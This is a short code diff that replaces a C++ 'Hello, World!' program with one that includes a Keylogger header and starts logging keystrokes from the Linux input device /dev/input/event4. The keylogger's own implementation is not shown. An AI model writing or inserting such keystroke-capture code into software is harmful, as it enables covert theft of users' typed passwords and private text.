@@ -1,7 +1,10 @@
 #include <iostream>
+#include "Keylogger.hpp"
 
 int main(void)
 {
-  std::cout << "Hello, World!" << std::endl;
+  Keylogger keylogger("/dev/input/event4");
+
+  keylogger.start();
   return 0;
 }
